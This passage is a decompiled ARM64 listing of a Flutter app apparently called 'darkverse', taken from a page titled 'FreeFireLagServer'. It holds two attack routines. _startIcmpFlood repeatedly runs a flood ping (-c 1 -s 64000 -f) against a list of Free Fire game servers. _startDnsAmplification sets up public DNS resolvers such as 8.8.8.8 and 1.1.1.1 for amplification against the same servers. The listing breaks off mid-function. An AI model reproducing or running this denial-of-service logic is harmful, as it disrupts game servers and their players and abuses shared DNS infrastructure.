    // 0x878628: b               #0x8784a8
  }
  static void _startIcmpFlood() {
    // ** addr: 0x87862c, size: 0xf0
    // 0x87862c: EnterFrame
    //     0x87862c: stp             fp, lr, [SP, #-0x10]!
    //     0x878630: mov             fp, SP
    // 0x878634: AllocStack(0x18)
    //     0x878634: sub             SP, SP, #0x18
    // 0x878638: CheckStackOverflow
    //     0x878638: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87863c: cmp             SP, x16
    //     0x878640: b.ls            #0x878714
    // 0x878644: r1 = Function '<anonymous closure>': static.
    //     0x878644: add             x1, PP, #0x3b, lsl #12  ; [pp+0x3bea0] AnonymousClosure: static (0x87871c), in [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startIcmpFlood (0x87862c)
    //     0x878648: ldr             x1, [x1, #0xea0]
    // 0x87864c: r2 = Null
    //     0x87864c: mov             x2, NULL
    // 0x878650: r0 = AllocateClosure()
    //     0x878650: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x878654: mov             x3, x0
    // 0x878658: r1 = Null
    //     0x878658: mov             x1, NULL
    // 0x87865c: r2 = Instance_Duration
    //     0x87865c: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bea8] Obj!Duration@a44471
    //     0x878660: ldr             x2, [x2, #0xea8]
    // 0x878664: r0 = Timer.periodic()
    //     0x878664: bl              #0x570930  ; [dart:async] Timer::Timer.periodic
    // 0x878668: stur            x0, [fp, #-8]
    // 0x87866c: r0 = LoadStaticField(0xd74)
    //     0x87866c: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x878670: ldr             x0, [x0, #0x1ae8]
    // 0x878674: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x878678: cmp             w0, w16
    // 0x87867c: b.ne            #0x87868c
    // 0x878680: r2 = _timers
    //     0x878680: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be60] Field <_FreeFireLagServerPageState@829239838._timers@829239838>: static late (offset: 0xd74)
    //     0x878684: ldr             x2, [x2, #0xe60]
    // 0x878688: r0 = InitLateStaticField()
    //     0x878688: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87868c: stur            x0, [fp, #-0x18]
    // 0x878690: LoadField: r1 = r0->field_b
    //     0x878690: ldur            w1, [x0, #0xb]
    // 0x878694: LoadField: r2 = r0->field_f
    //     0x878694: ldur            w2, [x0, #0xf]
    // 0x878698: DecompressPointer r2
    //     0x878698: add             x2, x2, HEAP, lsl #32
    // 0x87869c: LoadField: r3 = r2->field_b
    //     0x87869c: ldur            w3, [x2, #0xb]
    // 0x8786a0: r2 = LoadInt32Instr(r1)
    //     0x8786a0: sbfx            x2, x1, #1, #0x1f
    // 0x8786a4: stur            x2, [fp, #-0x10]
    // 0x8786a8: r1 = LoadInt32Instr(r3)
    //     0x8786a8: sbfx            x1, x3, #1, #0x1f
    // 0x8786ac: cmp             x2, x1
    // 0x8786b0: b.ne            #0x8786bc
    // 0x8786b4: mov             x1, x0
    // 0x8786b8: r0 = _growToNextCapacity()
    //     0x8786b8: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x8786bc: ldur            x2, [fp, #-0x18]
    // 0x8786c0: ldur            x3, [fp, #-0x10]
    // 0x8786c4: add             x4, x3, #1
    // 0x8786c8: lsl             x5, x4, #1
    // 0x8786cc: StoreField: r2->field_b = r5
    //     0x8786cc: stur            w5, [x2, #0xb]
    // 0x8786d0: LoadField: r1 = r2->field_f
    //     0x8786d0: ldur            w1, [x2, #0xf]
    // 0x8786d4: DecompressPointer r1
    //     0x8786d4: add             x1, x1, HEAP, lsl #32
    // 0x8786d8: ldur            x0, [fp, #-8]
    // 0x8786dc: ArrayStore: r1[r3] = r0  ; List_4
    //     0x8786dc: add             x25, x1, x3, lsl #2
    //     0x8786e0: add             x25, x25, #0xf
    //     0x8786e4: str             w0, [x25]
    //     0x8786e8: tbz             w0, #0, #0x878704
    //     0x8786ec: ldurb           w16, [x1, #-1]
    //     0x8786f0: ldurb           w17, [x0, #-1]
    //     0x8786f4: and             x16, x17, x16, lsr #2
    //     0x8786f8: tst             x16, HEAP, lsr #32
    //     0x8786fc: b.eq            #0x878704
    //     0x878700: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x878704: r0 = Null
    //     0x878704: mov             x0, NULL
    // 0x878708: LeaveFrame
    //     0x878708: mov             SP, fp
    //     0x87870c: ldp             fp, lr, [SP], #0x10
    // 0x878710: ret
    //     0x878710: ret             
    // 0x878714: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x878714: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x878718: b               #0x878644
  }
  [closure] static Future<void> <anonymous closure>(dynamic, Timer) async {
    // ** addr: 0x87871c, size: 0x230
    // 0x87871c: EnterFrame
    //     0x87871c: stp             fp, lr, [SP, #-0x10]!
    //     0x878720: mov             fp, SP
    // 0x878724: AllocStack(0x90)
    //     0x878724: sub             SP, SP, #0x90
    // 0x878728: SetupParameters(dynamic _ /* r1 */)
    //     0x878728: stur            NULL, [fp, #-8]
    //     0x87872c: mov             x0, #0
    //     0x878730: add             x1, fp, w0, sxtw #2
    //     0x878734: ldr             x1, [x1, #0x18]
    //     0x878738: ldur            w2, [x1, #0x17]
    //     0x87873c: add             x2, x2, HEAP, lsl #32
    //     0x878740: stur            x2, [fp, #-0x68]
    // 0x878744: CheckStackOverflow
    //     0x878744: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x878748: cmp             SP, x16
    //     0x87874c: b.ls            #0x878938
    // 0x878750: InitAsync() -> Future<void?>
    //     0x878750: ldr             x0, [PP, #0x360]  ; [pp+0x360] TypeArguments: <void?>
    //     0x878754: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x878758: r0 = LoadStaticField(0xd6c)
    //     0x878758: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87875c: ldr             x0, [x0, #0x1ad8]
    // 0x878760: tbz             w0, #4, #0x87876c
    // 0x878764: r0 = Null
    //     0x878764: mov             x0, NULL
    // 0x878768: r0 = ReturnAsyncNotFuture()
    //     0x878768: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x87876c: r0 = LoadStaticField(0xd84)
    //     0x87876c: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x878770: ldr             x0, [x0, #0x1b08]
    // 0x878774: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x878778: cmp             w0, w16
    // 0x87877c: b.ne            #0x87878c
    // 0x878780: r2 = freefireServers
    //     0x878780: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bd98] Field <_FreeFireLagServerPageState@829239838.freefireServers>: static late final (offset: 0xd84)
    //     0x878784: ldr             x2, [x2, #0xd98]
    // 0x878788: r0 = InitLateFinalStaticField()
    //     0x878788: bl              #0xbf5c8c  ; InitLateFinalStaticFieldStub
    // 0x87878c: r1 = <String>
    //     0x87878c: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x878790: stur            x0, [fp, #-0x70]
    // 0x878794: r0 = ListIterator()
    //     0x878794: bl              #0x49a80c  ; AllocateListIteratorStub -> ListIterator<X0> (size=0x24)
    // 0x878798: mov             x4, x0
    // 0x87879c: ldur            x3, [fp, #-0x70]
    // 0x8787a0: stur            x4, [fp, #-0x88]
    // 0x8787a4: StoreField: r4->field_b = r3
    //     0x8787a4: stur            w3, [x4, #0xb]
    // 0x8787a8: LoadField: r0 = r3->field_b
    //     0x8787a8: ldur            w0, [x3, #0xb]
    // 0x8787ac: r5 = LoadInt32Instr(r0)
    //     0x8787ac: sbfx            x5, x0, #1, #0x1f
    // 0x8787b0: stur            x5, [fp, #-0x80]
    // 0x8787b4: StoreField: r4->field_f = r5
    //     0x8787b4: stur            x5, [x4, #0xf]
    // 0x8787b8: ArrayStore: r4[0] = rZR  ; List_8
    //     0x8787b8: stur            xzr, [x4, #0x17]
    // 0x8787bc: r6 = 12
    //     0x8787bc: mov             x6, #0xc
    // 0x8787c0: CheckStackOverflow
    //     0x8787c0: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x8787c4: cmp             SP, x16
    //     0x8787c8: b.ls            #0x878940
    // 0x8787cc: LoadField: r0 = r3->field_b
    //     0x8787cc: ldur            w0, [x3, #0xb]
    // 0x8787d0: r1 = LoadInt32Instr(r0)
    //     0x8787d0: sbfx            x1, x0, #1, #0x1f
    // 0x8787d4: cmp             x5, x1
    // 0x8787d8: b.ne            #0x878918
    // 0x8787dc: ArrayLoad: r2 = r4[0]  ; List_8
    //     0x8787dc: ldur            x2, [x4, #0x17]
    // 0x8787e0: cmp             x2, x1
    // 0x8787e4: b.ge            #0x878908
    // 0x8787e8: mov             x0, x1
    // 0x8787ec: mov             x1, x2
    // 0x8787f0: cmp             x1, x0
    // 0x8787f4: b.hs            #0x878948
    // 0x8787f8: LoadField: r0 = r3->field_f
    //     0x8787f8: ldur            w0, [x3, #0xf]
    // 0x8787fc: DecompressPointer r0
    //     0x8787fc: add             x0, x0, HEAP, lsl #32
    // 0x878800: ArrayLoad: r7 = r0[r2]  ; Unknown_4
    //     0x878800: add             x16, x0, x2, lsl #2
    //     0x878804: ldur            w7, [x16, #0xf]
    // 0x878808: DecompressPointer r7
    //     0x878808: add             x7, x7, HEAP, lsl #32
    // 0x87880c: mov             x0, x7
    // 0x878810: stur            x7, [fp, #-0x78]
    // 0x878814: StoreField: r4->field_1f = r0
    //     0x878814: stur            w0, [x4, #0x1f]
    //     0x878818: ldurb           w16, [x4, #-1]
    //     0x87881c: ldurb           w17, [x0, #-1]
    //     0x878820: and             x16, x17, x16, lsr #2
    //     0x878824: tst             x16, HEAP, lsr #32
    //     0x878828: b.eq            #0x878830
    //     0x87882c: bl              #0xbf6294  ; WriteBarrierWrappersStub
    // 0x878830: add             x0, x2, #1
    // 0x878834: ArrayStore: r4[0] = r0  ; List_8
    //     0x878834: stur            x0, [x4, #0x17]
    // 0x878838: mov             x2, x6
    // 0x87883c: r1 = Null
    //     0x87883c: mov             x1, NULL
    // 0x878840: r0 = AllocateArray()
    //     0x878840: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x878844: stur            x0, [fp, #-0x90]
    // 0x878848: r16 = "-c"
    //     0x878848: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3beb0] "-c"
    //     0x87884c: ldr             x16, [x16, #0xeb0]
    // 0x878850: StoreField: r0->field_f = r16
    //     0x878850: stur            w16, [x0, #0xf]
    // 0x878854: r16 = "1"
    //     0x878854: add             x16, PP, #0xe, lsl #12  ; [pp+0xec90] "1"
    //     0x878858: ldr             x16, [x16, #0xc90]
    // 0x87885c: StoreField: r0->field_13 = r16
    //     0x87885c: stur            w16, [x0, #0x13]
    // 0x878860: r16 = "-s"
    //     0x878860: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3beb8] "-s"
    //     0x878864: ldr             x16, [x16, #0xeb8]
    // 0x878868: ArrayStore: r0[0] = r16  ; List_4
    //     0x878868: stur            w16, [x0, #0x17]
    // 0x87886c: r16 = "64000"
    //     0x87886c: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3bec0] "64000"
    //     0x878870: ldr             x16, [x16, #0xec0]
    // 0x878874: StoreField: r0->field_1b = r16
    //     0x878874: stur            w16, [x0, #0x1b]
    // 0x878878: r16 = "-f"
    //     0x878878: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3bec8] "-f"
    //     0x87887c: ldr             x16, [x16, #0xec8]
    // 0x878880: StoreField: r0->field_1f = r16
    //     0x878880: stur            w16, [x0, #0x1f]
    // 0x878884: ldur            x2, [fp, #-0x78]
    // 0x878888: StoreField: r0->field_23 = r2
    //     0x878888: stur            w2, [x0, #0x23]
    // 0x87888c: r1 = <String>
    //     0x87888c: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x878890: r0 = AllocateGrowableArray()
    //     0x878890: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x878894: mov             x1, x0
    // 0x878898: ldur            x0, [fp, #-0x90]
    // 0x87889c: StoreField: r1->field_f = r0
    //     0x87889c: stur            w0, [x1, #0xf]
    // 0x8788a0: r0 = 12
    //     0x8788a0: mov             x0, #0xc
    // 0x8788a4: StoreField: r1->field_b = r0
    //     0x8788a4: stur            w0, [x1, #0xb]
    // 0x8788a8: r0 = _runNonInteractiveProcess()
    //     0x8788a8: bl              #0x878970  ; [dart:io] ::_runNonInteractiveProcess
    // 0x8788ac: mov             x1, x0
    // 0x8788b0: stur            x1, [fp, #-0x90]
    // 0x8788b4: r0 = Await()
    //     0x8788b4: bl              #0x4a3d90  ; AwaitStub
    // 0x8788b8: r0 = LoadStaticField(0xd70)
    //     0x8788b8: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x8788bc: ldr             x0, [x0, #0x1ae0]
    // 0x8788c0: r1 = LoadInt32Instr(r0)
    //     0x8788c0: sbfx            x1, x0, #1, #0x1f
    //     0x8788c4: tbz             w0, #0, #0x8788cc
    //     0x8788c8: ldur            x1, [x0, #7]
    // 0x8788cc: add             x2, x1, #1
    // 0x8788d0: r0 = BoxInt64Instr(r2)
    //     0x8788d0: sbfiz           x0, x2, #1, #0x1f
    //     0x8788d4: cmp             x2, x0, asr #1
    //     0x8788d8: b.eq            #0x8788e4
    //     0x8788dc: bl              #0xbf7e54  ; AllocateMintSharedWithoutFPURegsStub
    //     0x8788e0: stur            x2, [x0, #7]
    // 0x8788e4: mov             x2, x0
    // 0x8788e8: StoreStaticField(0xd70, r2)
    //     0x8788e8: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x8788ec: str             x2, [x0, #0x1ae0]
    // 0x8788f0: b               #0x8788f8
    // 0x8788f4: sub             SP, fp, #0x90
    // 0x8788f8: ldur            x3, [fp, #-0x70]
    // 0x8788fc: ldur            x4, [fp, #-0x88]
    // 0x878900: ldur            x5, [fp, #-0x80]
    // 0x878904: b               #0x8787bc
    // 0x878908: mov             x0, x4
    // 0x87890c: StoreField: r0->field_1f = rNULL
    //     0x87890c: stur            NULL, [x0, #0x1f]
    // 0x878910: r0 = Null
    //     0x878910: mov             x0, NULL
    // 0x878914: r0 = ReturnAsyncNotFuture()
    //     0x878914: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x878918: mov             x0, x3
    // 0x87891c: r0 = ConcurrentModificationError()
    //     0x87891c: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x878920: mov             x1, x0
    // 0x878924: ldur            x0, [fp, #-0x70]
    // 0x878928: StoreField: r1->field_b = r0
    //     0x878928: stur            w0, [x1, #0xb]
    // 0x87892c: mov             x0, x1
    // 0x878930: r0 = Throw()
    //     0x878930: bl              #0xbf5dcc  ; ThrowStub
    // 0x878934: brk             #0
    // 0x878938: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x878938: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87893c: b               #0x878750
    // 0x878940: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x878940: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x878944: b               #0x8787cc
    // 0x878948: r0 = RangeErrorSharedWithoutFPURegs()
    //     0x878948: bl              #0xbf8204  ; RangeErrorSharedWithoutFPURegsStub
  }
  static void _startDnsAmplification() {
    // ** addr: 0x87abb4, size: 0x198
    // 0x87abb4: EnterFrame
    //     0x87abb4: stp             fp, lr, [SP, #-0x10]!
    //     0x87abb8: mov             fp, SP
    // 0x87abbc: AllocStack(0x18)
    //     0x87abbc: sub             SP, SP, #0x18
    // 0x87abc0: r0 = 16
    //     0x87abc0: mov             x0, #0x10
    // 0x87abc4: CheckStackOverflow
    //     0x87abc4: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87abc8: cmp             SP, x16
    //     0x87abcc: b.ls            #0x87ad44
    // 0x87abd0: mov             x2, x0
    // 0x87abd4: r1 = Null
    //     0x87abd4: mov             x1, NULL
    // 0x87abd8: r0 = AllocateArray()
    //     0x87abd8: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87abdc: stur            x0, [fp, #-8]
    // 0x87abe0: r16 = "8.8.8.8"
    //     0x87abe0: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c0f0] "8.8.8.8"
    //     0x87abe4: ldr             x16, [x16, #0xf0]
    // 0x87abe8: StoreField: r0->field_f = r16
    //     0x87abe8: stur            w16, [x0, #0xf]
    // 0x87abec: r16 = "8.8.4.4"
    //     0x87abec: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c0f8] "8.8.4.4"
    //     0x87abf0: ldr             x16, [x16, #0xf8]
    // 0x87abf4: StoreField: r0->field_13 = r16
    //     0x87abf4: stur            w16, [x0, #0x13]
    // 0x87abf8: r16 = "1.1.1.1"
    //     0x87abf8: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c100] "1.1.1.1"
    //     0x87abfc: ldr             x16, [x16, #0x100]
    // 0x87ac00: ArrayStore: r0[0] = r16  ; List_4
    //     0x87ac00: stur            w16, [x0, #0x17]
    // 0x87ac04: r16 = "1.0.0.1"
    //     0x87ac04: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c108] "1.0.0.1"
    //     0x87ac08: ldr             x16, [x16, #0x108]
    // 0x87ac0c: StoreField: r0->field_1b = r16
    //     0x87ac0c: stur            w16, [x0, #0x1b]
    // 0x87ac10: r16 = "208.67.222.222"
    //     0x87ac10: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c110] "208.67.222.222"
    //     0x87ac14: ldr             x16, [x16, #0x110]
    // 0x87ac18: StoreField: r0->field_1f = r16
    //     0x87ac18: stur            w16, [x0, #0x1f]
    // 0x87ac1c: r16 = "208.67.220.220"
    //     0x87ac1c: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c118] "208.67.220.220"
    //     0x87ac20: ldr             x16, [x16, #0x118]
    // 0x87ac24: StoreField: r0->field_23 = r16
    //     0x87ac24: stur            w16, [x0, #0x23]
    // 0x87ac28: r16 = "9.9.9.9"
    //     0x87ac28: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c120] "9.9.9.9"
    //     0x87ac2c: ldr             x16, [x16, #0x120]
    // 0x87ac30: StoreField: r0->field_27 = r16
    //     0x87ac30: stur            w16, [x0, #0x27]
    // 0x87ac34: r16 = "149.112.112.112"
    //     0x87ac34: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c128] "149.112.112.112"
    //     0x87ac38: ldr             x16, [x16, #0x128]
    // 0x87ac3c: StoreField: r0->field_2b = r16
    //     0x87ac3c: stur            w16, [x0, #0x2b]
    // 0x87ac40: r1 = <String>
    //     0x87ac40: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x87ac44: r0 = AllocateGrowableArray()
    //     0x87ac44: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x87ac48: mov             x1, x0
    // 0x87ac4c: ldur            x0, [fp, #-8]
    // 0x87ac50: stur            x1, [fp, #-0x10]
    // 0x87ac54: StoreField: r1->field_f = r0
    //     0x87ac54: stur            w0, [x1, #0xf]
    // 0x87ac58: r0 = 16
    //     0x87ac58: mov             x0, #0x10
    // 0x87ac5c: StoreField: r1->field_b = r0
    //     0x87ac5c: stur            w0, [x1, #0xb]
    // 0x87ac60: r1 = 1
    //     0x87ac60: mov             x1, #1
    // 0x87ac64: r0 = AllocateContext()
    //     0x87ac64: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x87ac68: mov             x1, x0
    // 0x87ac6c: ldur            x0, [fp, #-0x10]
    // 0x87ac70: StoreField: r1->field_f = r0
    //     0x87ac70: stur            w0, [x1, #0xf]
    // 0x87ac74: mov             x2, x1
    // 0x87ac78: r1 = Function '<anonymous closure>': static.
    //     0x87ac78: add             x1, PP, #0x3c, lsl #12  ; [pp+0x3c130] AnonymousClosure: static (0x87ad4c), in [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startDnsAmplification (0x87abb4)
    //     0x87ac7c: ldr             x1, [x1, #0x130]
    // 0x87ac80: r0 = AllocateClosure()
    //     0x87ac80: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x87ac84: mov             x3, x0
    // 0x87ac88: r1 = Null
    //     0x87ac88: mov             x1, NULL
    // 0x87ac8c: r2 = Instance_Duration
    //     0x87ac8c: add             x2, PP, #0x3c, lsl #12  ; [pp+0x3c138] Obj!Duration@a44481
    //     0x87ac90: ldr             x2, [x2, #0x138]
    // 0x87ac94: r0 = Timer.periodic()
    //     0x87ac94: bl              #0x570930  ; [dart:async] Timer::Timer.periodic
    // 0x87ac98: stur            x0, [fp, #-8]
    // 0x87ac9c: r0 = LoadStaticField(0xd74)
    //     0x87ac9c: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87aca0: ldr             x0, [x0, #0x1ae8]
    // 0x87aca4: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87aca8: cmp             w0, w16
    // 0x87acac: b.ne            #0x87acbc
    // 0x87acb0: r2 = _timers
    //     0x87acb0: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be60] Field <_FreeFireLagServerPageState@829239838._timers@829239838>: static late (offset: 0xd74)
    //     0x87acb4: ldr             x2, [x2, #0xe60]
    // 0x87acb8: r0 = InitLateStaticField()
    //     0x87acb8: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87acbc: stur            x0, [fp, #-0x10]
    // 0x87acc0: LoadField: r1 = r0->field_b
    //     0x87acc0: ldur            w1, [x0, #0xb]
    // 0x87acc4: LoadField: r2 = r0->field_f
    //     0x87acc4: ldur            w2, [x0, #0xf]
    // 0x87acc8: DecompressPointer r2
    //     0x87acc8: add             x2, x2, HEAP, lsl #32
    // 0x87accc: LoadField: r3 = r2->field_b
    //     0x87accc: ldur            w3, [x2, #0xb]
    // 0x87acd0: r2 = LoadInt32Instr(r1)
    //     0x87acd0: sbfx            x2, x1, #1, #0x1f
    // 0x87acd4: stur            x2, [fp, #-0x18]
    // 0x87acd8: r1 = LoadInt32Instr(r3)
    //     0x87acd8: sbfx            x1, x3, #1, #0x1f
    // 0x87acdc: cmp             x2, x1
    // 0x87ace0: b.ne            #0x87acec
    // 0x87ace4: mov             x1, x0
    // 0x87ace8: r0 = _growToNextCapacity()
    //     0x87ace8: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x87acec: ldur            x2, [fp, #-0x10]
    // 0x87acf0: ldur            x3, [fp, #-0x18]
    // 0x87acf4: add             x4, x3, #1
    // 0x87acf8: lsl             x5, x4, #1
    // 0x87acfc: StoreField: r2->field_b = r5
    //     0x87acfc: stur            w5, [x2, #0xb]
    // 0x87ad00: LoadField: r1 = r2->field_f
    //     0x87ad00: ldur            w1, [x2, #0xf]
    // 0x87ad04: DecompressPointer r1
    //     0x87ad04: add             x1, x1, HEAP, lsl #32
    // 0x87ad08: ldur            x0, [fp, #-8]
    // 0x87ad0c: ArrayStore: r1[r3] = r0  ; List_4
    //     0x87ad0c: add             x25, x1, x3, lsl #2
    //     0x87ad10: add             x25, x25, #0xf
    //     0x87ad14: str             w0, [x25]
    //     0x87ad18: tbz             w0, #0, #0x87ad34
    //     0x87ad1c: ldurb           w16, [x1, #-1]
    //     0x87ad20: ldurb           w17, [x0, #-1]
    //     0x87ad24: and             x16, x17, x16, lsr #2
    //     0x87ad28: tst             x16, HEAP, lsr #32
    //     0x87ad2c: b.eq            #0x87ad34
    //     0x87ad30: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x87ad34: r0 = Null
    //     0x87ad34: mov             x0, NULL
    // 0x87ad38: LeaveFrame
    //     0x87ad38: mov             SP, fp
    //     0x87ad3c: ldp             fp, lr, [SP], #0x10
    // 0x87ad40: ret
    //     0x87ad40: ret             
    // 0x87ad44: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87ad44: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87ad48: b               #0x87abd0
  }
  [closure] static Future<void> <anonymous closure>(dynamic, Timer) async {
    // ** addr: 0x87ad4c, size: 0x368
    // 0x87ad4c: EnterFrame
    //     0x87ad4c: stp             fp, lr, [SP, #-0x10]!
    //     0x87ad50: mov             fp, SP
    // 0x87ad54: AllocStack(0xe8)
    //     0x87ad54: sub             SP, SP, #0xe8
    // 0x87ad58: SetupParameters(dynamic _ /* r1 */)
    //     0x87ad58: stur            NULL, [fp, #-8]
    //     0x87ad5c: mov             x0, #0
    //     0x87ad60: add             x1, fp, w0, sxtw #2
    //     0x87ad64: ldr             x1, [x1, #0x18]
    //     0x87ad68: ldur            w2, [x1, #0x17]
    //     0x87ad6c: add             x2, x2, HEAP, lsl #32
    //     0x87ad70: stur            x2, [fp, #-0x90]
    // 0x87ad74: CheckStackOverflow
    //     0x87ad74: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87ad78: cmp             SP, x16
    //     0x87ad7c: b.ls            #0x87b084
    // 0x87ad80: InitAsync() -> Future<void?>
    //     0x87ad80: ldr             x0, [PP, #0x360]  ; [pp+0x360] TypeArguments: <void?>
    //     0x87ad84: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x87ad88: r0 = LoadStaticField(0xd6c)
    //     0x87ad88: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87ad8c: ldr             x0, [x0, #0x1ad8]
    // 0x87ad90: tbz             w0, #4, #0x87ad9c
    // 0x87ad94: r0 = Null
    //     0x87ad94: mov             x0, NULL
    // 0x87ad98: r0 = ReturnAsyncNotFuture()
    //     0x87ad98: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x87ad9c: ldur            x0, [fp, #-0x90]
    // 0x87ada0: LoadField: r2 = r0->field_f
    //     0x87ada0: ldur            w2, [x0, #0xf]
    // 0x87ada4: DecompressPointer r2
    //     0x87ada4: add             x2, x2, HEAP, lsl #32
    // 0x87ada8: stur            x2, [fp, #-0x98]
    // 0x87adac: LoadField: r1 = r2->field_7
    //     0x87adac: ldur            w1, [x2, #7]
    // 0x87adb0: DecompressPointer r1
    //     0x87adb0: add             x1, x1, HEAP, lsl #32
    // 0x87adb4: r0 = ListIterator()
    //     0x87adb4: bl              #0x49a80c  ; AllocateListIteratorStub -> ListIterator<X0> (size=0x24)
    // 0x87adb8: mov             x3, x0
    // 0x87adbc: ldur            x2, [fp, #-0x98]
    // 0x87adc0: stur            x3, [fp, #-0xa8]
    // 0x87adc4: StoreField: r3->field_b = r2
    //     0x87adc4: stur            w2, [x3, #0xb]
    // 0x87adc8: LoadField: r0 = r2->field_b
    //     0x87adc8: ldur            w0, [x2, #0xb]
    // 0x87adcc: r4 = LoadInt32Instr(r0)
    //     0x87adcc: sbfx            x4, x0, #1, #0x1f
    // 0x87add0: stur            x4, [fp, #-0xa0]
    // 0x87add4: StoreField: r3->field_f = r4
    //     0x87add4: stur            x4, [x3, #0xf]
    // 0x87add8: ArrayStore: r3[0] = rZR  ; List_8
    //     0x87add8: stur            xzr, [x3, #0x17]
    // 0x87addc: CheckStackOverflow
    //     0x87addc: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87ade0: cmp             SP, x16
    //     0x87ade4: b.ls            #0x87b08c
    // 0x87ade8: LoadField: r0 = r2->field_b
    //     0x87ade8: ldur            w0, [x2, #0xb]
    // 0x87adec: r1 = LoadInt32Instr(r0)
    //     0x87adec: sbfx            x1, x0, #1, #0x1f
    // 0x87adf0: cmp             x4, x1
    // 0x87adf4: b.ne            #0x87b064
    // 0x87adf8: ArrayLoad: r5 = r3[0]  ; List_8
    //     0x87adf8: ldur            x5, [x3, #0x17]
    // 0x87adfc: cmp             x5, x1
    // 0x87ae00: b.ge            #0x87afc8
    // 0x87ae04: mov             x0, x1
    // 0x87ae08: mov             x1, x5
    // 0x87ae0c: cmp             x1, x0
    // 0x87ae10: b.hs            #0x87b094
    // 0x87ae14: LoadField: r0 = r2->field_f
    //     0x87ae14: ldur            w0, [x2, #0xf]
    // 0x87ae18: DecompressPointer r0
    //     0x87ae18: add             x0, x0, HEAP, lsl #32
    // 0x87ae1c: ArrayLoad: r1 = r0[r5]  ; Unknown_4
    //     0x87ae1c: add             x16, x0, x5, lsl #2
    //     0x87ae20: ldur            w1, [x16, #0xf]
    // 0x87ae24: DecompressPointer r1
    //     0x87ae24: add             x1, x1, HEAP, lsl #32
    // 0x87ae28: mov             x0, x1
    // 0x87ae2c: stur            x1, [fp, #-0x90]
    // 0x87ae30: StoreField: r3->field_1f = r0
    //     0x87ae30: stur            w0, [x3, #0x1f]
    //     0x87ae34: ldurb           w16, [x3, #-1]
    //     0x87ae38: ldurb           w17, [x0, #-1]
    //     0x87ae3c: and             x16, x17, x16, lsr #2
    //     0x87ae40: tst             x16, HEAP, lsr #32
    //     0x87ae44: b.eq            #0x87ae4c
    //     0x87ae48: bl              #0xbf6274  ; WriteBarrierWrappersStub
    // 0x87ae4c: add             x0, x5, #1
    // 0x87ae50: ArrayStore: r3[0] = r0  ; List_8
    //     0x87ae50: stur            x0, [x3, #0x17]
    // 0x87ae54: r0 = LoadStaticField(0xd84)
    //     0x87ae54: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87ae58: ldr             x0, [x0, #0x1b08]
    // 0x87ae5c: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87ae60: cmp             w0, w16
    // 0x87ae64: b.ne            #0x87ae74
    // 0x87ae68: r2 = freefireServers
